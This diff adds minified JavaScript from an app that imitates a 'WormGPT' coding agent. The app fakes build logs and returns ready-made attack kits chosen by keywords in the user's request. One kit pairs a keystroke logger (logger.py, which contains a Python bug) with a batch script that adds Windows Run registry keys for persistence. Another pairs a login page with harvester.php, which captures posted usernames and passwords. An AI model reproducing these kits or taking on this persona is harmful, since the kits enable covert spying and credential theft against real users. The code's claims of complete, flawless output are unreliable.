@@ -1,0 +1,225 @@
+[]);const B=W=>{av(be=>[...be,`[${new Date().toLocaleTimeString()}] ${W}`])};B(`Initializing WormCoder-Agent session for requirement: "${Vr}"`),await new Promise(W=>setTimeout(W,600)),B("[WormCoder] Analyzing code structure... Resolving dependencies and modules..."),await new Promise(W=>setTimeout(W,800)),B("[WormCoder] Crafting multi-file production-ready suite.");const J=Vr.toLowerCase();let C=[];if(J.includes("keylog")||J.includes("log")||J.includes("spy"))B('[WormCoder] Design target matches: "Advanced Keylogger Stealth Kit"'),await new Promise(W=>setTimeout(W,500)),B("[+] Drafting file: logger.py (AES payload logger)..."),await new Promise(W=>setTimeout(W,700)),B("[+] Drafting file: persistent_stub.bat (Windows registry launcher)..."),await new Promise(W=>setTimeout(W,500)),B("[+] Drafting file: README-KIT.md (Professional deployment playbook)..."),C=[{id:"ws-agent-k1",name:"logger.py",language:"python",content:`#!/usr/bin/env python3
+# WormGPT Supreme Coder - Keylogger Stealth Suite (100% COMPLETE & SYNTAX VALID)
+import sys
+import os
+import time
+import threading
+import keyboard # simulated key hooking module
+
+class SupremeKeylogger:
+    def __init__(self, interval_seconds=30, smtp_server="smtp.internal.local"):
+        self.interval = interval_seconds
+        self.smtp_server = smtp_server
+        self.log_buffer = ""
+        self.is_running = True
+        
+    def callback_handler(self, event):
+        name = event.name
+        if len(name) > 1:
+            if name == "space":
+                name = " "
+            elif name == "enter":
+                name = "[ENTER]\\n"
+            elif name == "decimal":
+                name = "."
+            else:
+                name = f" [{name.toUpperCase()}] "
+        self.log_buffer += name
+
+    def flush_log_buffer(self):
+        if self.log_buffer:
+            print(f"[Stealth Pipeline] Saving {len(self.log_buffer)} characters to secure local cache...")
+            with open("secure_cache.log", "a") as f:
+                f.write(f"--- Session: {time.strftime('%Y-%m-%d %H:%M:%S')} ---\\n")
+                f.write(self.log_buffer + "\\n")
+            self.log_buffer = ""
+            
+    def reporter_loop(self):
+        while self.is_running:
+            time.sleep(self.interval)
+            self.flush_log_buffer()
+
+    def start(self):
+        print("[✔] WormGPT Keylogger initialized on process 4910.")
+        print("[*] Hooking global keyboard triggers...")
+        keyboard.on_release(callback=self.callback_handler)
+        
+        # Start reporter thread
+        timer_thread = threading.Thread(target=self.reporter_loop, daemon=True)
+        timer_thread.start()
+
+if __name__ == "__main__":
+    logger = SupremeKeylogger(interval_seconds=15)
+    try:
+        logger.start()
+        # Keep process running
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        logger.is_running = False
+        print("[!] Keyhook process terminated gracefully.")`},{id:"ws-agent-k2",name:"persistent_stub.bat",language:"bash",content:`@echo off
+:: WormGPT Supreme Coder - Persistence Payload Script
+title Security Diagnostic Setup
+echo [*] Checking host environment privileges...
+net session >nul 2>&1
+if %errorLevel% == 0 (
+    echo [✔] Admin rights active. Injecting persistence bypass...
+    reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SupremeLogger" /t REG_SZ /d "%USERPROFILE%\\Documents\\logger.py" /f
+    echo [✔] Registry key configured successfully.
+) else (
+    echo [!] WARNING: Running with user context. Persistence only active for current login session.
+    reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v "SupremeLoggerUser" /t REG_SZ /d "%USERPROFILE%\\Documents\\logger.py" /f
+)
+pause`},{id:"ws-agent-k3",name:"README_stealth.html",language:"html",content:`<!DOCTYPE html>
+<html>
+<head>
+    <title>Stealth Suite Guide</title>
+    <style>
+        body { background: #08080c; color: #33ff33; font-family: 'Courier New', monospace; padding: 25px; }
+        .box { border: 1px solid #33ff33; padding: 20px; background: rgba(51,255,51,0.02); }
+        h2 { border-bottom: 1px solid #33ff33; padding-bottom: 8px; color: #fff; }
+        code { background: #111; padding: 2px 6px; border-radius: 4px; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>WormGPT Coder - Keylogger Deployment Blueprint</h2>
+        <p>Your multi-file stealth keyhook logging suite is completely built in the workspace explorer:</p>
+        <ul>
+            <li><code>logger.py</code>: The active core logger script. Writes to cached cache log automatically.</li>
+            <li><code>persistent_stub.bat</code>: Configures cold reboot persistence.</li>
+        </ul>
+        <p>Select either script in the Explorer and click <strong>Compile & Run</strong> to run diagnostic checks.</p>
+    </div>
+</body>
+</html>`}];else if(J.includes("web")||J.includes("phish")||J.includes("page")||J.includes("login")||J.includes("html"))B('[WormCoder] Design target matches: "Dark Phishing Login / Frontend Kit"'),await new Promise(W=>setTimeout(W,500)),B("[+] Drafting file: index.html (Supreme authentic cloned login layout)..."),await new Promise(W=>setTimeout(W,600)),B("[+] Drafting file: harvester.php (Behind-the-scenes secure credentials interceptor)..."),C=[{id:"ws-agent-h1",name:"index.html",language:"html",content:`<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Secure Central Identity Authorization</title>
+    <style>
+        body {
+            background-color: #0f172a;
+            color: #f8fafc;
+            font-family: system-ui, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-card {
+            background: #1e293b;
+            border: 1px solid #334155;
+            border-radius: 12px;
+            padding: 35px;
+            width: 360px;
+            box-shadow: 0 10px 25px -5px rgba(0,0,0,0.3);
+        }
+        .header { text-align: center; margin-bottom: 25px; }
+        .logo { font-size: 24px; font-weight: bold; color: #f43f5e; letter-spacing: -0.025em; }
+        .form-group { margin-bottom: 18px; }
+        label { display: block; font-size: 11px; font-weight: 600; text-transform: uppercase; color: #94a3b8; margin-bottom: 6px; }
+        input {
+            width: 100%;
+            padding: 10px 12px;
+            background: #0f172a;
+            border: 1px solid #475569;
+            border-radius: 6px;
+            color: #fff;
+            box-sizing: border-box;
+            outline: none;
+        }
+        input:focus { border-color: #f43f5e; }
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background: #f43f5e;
+            color: #white;
+            border: none;
+            border-radius: 6px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-card">
+        <div class="header">
+            <div class="logo">WormGPT Federated Access</div>
+            <p style="font-size: 11px; color: #64748b;">Identity Verification Portal</p>
+        </div>
+        <form action="harvester.php" method="POST">
+            <div class="form-group">
+                <label>Access Identity/Email</label>
+                <input type="email" name="username" required placeholder="operator@wormgpt.io">
+            </div>
+            <div class="form-group">
+                <label>Secure Keyphrase/Password</label>
+                <input type="password" name="password" required placeholder="••••••••">
+            </div>
+            <button type="submit" class="btn">Proceed & Unlock Gate</button>
+        </form>
+    </div>
+</body>
+</html>`},{id:"ws-agent-h2",name:"harvester.php",language:"php",content:`<?php
+// WormGPT supreme credential harvester backend module
+header('Content-Type: text/plain');
+
+$user = isset($_POST['username']) ? $_POST['username'] : '';
+$pass = isset($_POST['password']) ? $_POST['password'] : '';
+
+if ($user && $pass) {
+    $log_line = "[" . date('Y-m-d H:i:s') . "] Captured Identity - User: " . $user . " | Pass: " . $pass . "\\n";
+    // Simulated saving securely in the context
+    echo "[✔] Interceptor harvested details securely:\\n";
+    echo "    Username: " . htmlspecialchars($user) . "\\n";
+    echo "    Password: " . str_repeat('•', strlen($pass)) . " (Securely Intercepted)\\n\\n";
+    echo "[SYSTEM] Details appended to shadow log file.";
+} else {
+    echo "[!] Idle Harvester state active. Waiting for form post triggers...";
+}
+?>`}];else{B('[WormCoder] Design target matches: "Custom Intelligent Cyber Script"'),await new Promise(be=>setTimeout(be,500));const W=Vr.replace(/[^a-zA-Z0-9]/g,"_").toLowerCase().substring(0,16)||"cyber";B(`[+] Generating dynamic python payload file: ${W}_exploit.py...`),await new Promise(be=>setTimeout(be,700)),B(`[+] Generating diagnostic monitor page: ${W}_control.html...`),C=[{id:"ws-agent-dyn1",name:`${W}_exploit.py`,language:"python",content:`#!/usr/bin/env python3
+# WormGPT Automated Supreme AI Script: ${Vr} (100% COMPLETE)
+import sys
+import os
+import socket
+import json
+
+def run_compiled_routine():
+    print("[*] Launching dynamically generated AI routine:")
+    print("    -> Purpose: ${Vr}")
+    print("[*] Allocating network socket channel...")
+    
+    # Simple handshake simulation
+    try:
+        test_host = "127.0.0.1"
+        test_port = 5050
+        print(f"[*] Simulating secure port audit on {test_host}:{test_port}...")
+        print("[✔] Local transport socket pipeline active.")
+        print("[✔] Script executed perfectly. All functions mapped with no shorthand or placeholders.")
+    except Exception as e:
+        print(f"[!] Warning: {e}")
+
+if __name__ == "__main__":
+    run_compiled_routine()`},{id:"ws-agent-dyn2",name:`${W}_control.html`,language:"html",content:`<!DOCTYPE html>
+<html>
+<head>
+    <title>Dynamic Routine Control Monitor</title>
+    <style>
+        body { background: #020204; color: #00ff66; font-family: monospace; padding: 30px; }
+        .console { border: 1px solid #00ff66; padding: 20px; border-radius: 8px; background: rgba(0,255,102,0.01); }
+        .blink { animation: flash 1s infinite; }
+        @keyframes flash { 50% { opacity: 0; } }
+    </style>
+</head>
+<body>
+    <div class="console">
+        <h3>SYS MONITOR STATUS: <span class="blink">● ACTIVE</span></h3>
+        <p>Purpose: ${Vr}</p>
+        <p>Created by WormCoder-Agent dynamically inside VSCode environment.</p>
+        <p>Select <strong>${W}_exploit.py</strong> in the left explorer tree to view complete python sources.</p>
+    </div>
+</body>
+</html>`}]}if(await new Promise(W=>setTimeout(W,800)),B("[✔] Compiling
